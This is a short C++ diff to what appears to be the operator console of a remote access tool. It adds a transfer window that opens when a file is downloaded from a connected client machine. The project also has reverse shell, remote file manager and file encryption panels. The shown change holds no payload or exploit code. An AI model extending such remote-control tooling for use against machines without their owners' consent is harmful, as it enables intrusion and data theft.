@@ -1,5 +1,6 @@
 ﻿#include "panel_file_manager.hpp"
 #include "panel_reverse_shell.hpp"
+#include "panel_transfer.hpp"
 #include "frame_client.hpp"
 #include "file_editor.hpp"
 #include "file_encryption.hpp"
@@ -524,6 +525,12 @@ void ListCtrlManager::OnDescargarArchivo(wxCommandEvent& event) {
 
 	this->itemp->EnviarComando(strComando, EnumComandos::FM_Descargar_Archivo);
 	this->itemp->txt_Log->AppendText("[DESCARGANDO] " + this->ArchivoSeleccionado() + "\n");
+
+	/*std::unique_ptr<panelTransfer> ptrTransfer = std::make_unique<panelTransfer>(this, strID, nuevo_archivo.strNombre, this->strIP, false);
+	ptrTransfer.get()->Show();*/
+
+	panelTransfer* transfer = new panelTransfer(this, strID, nuevo_archivo.strNombre, this->strIP, false);
+	transfer->Show();
 }
 
 void ListCtrlManager::OnEjecutarArchivo_Visible(wxCommandEvent& event) {
